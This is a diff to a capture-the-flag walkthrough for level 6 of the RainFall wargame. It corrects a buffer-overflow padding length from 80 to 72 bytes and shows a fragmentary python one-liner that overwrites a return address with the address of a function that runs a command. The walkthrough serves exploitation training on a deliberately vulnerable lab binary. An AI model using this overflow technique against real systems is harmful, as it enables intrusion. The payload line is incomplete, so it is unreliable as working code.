@@ -50,7 +50,7 @@ By calculating the position of `0x41346341` in the string, we determine the **of
 To exploit the program:
 
 * **Shellcode is not needed** here because the binary already has a function (`n`) that runs the command for us.
-* We need: `padding (80 bytes) + address of n()`
+* We need: `padding (72 bytes) + address of n()`
 
 ```bash
 python -c 'print "A" * 72 + "add de n"
@@ -85,5 +85,6 @@ level6@RainFall:~$
 ---
 
 **End of Level 6 Walkthrough**
+
 
 
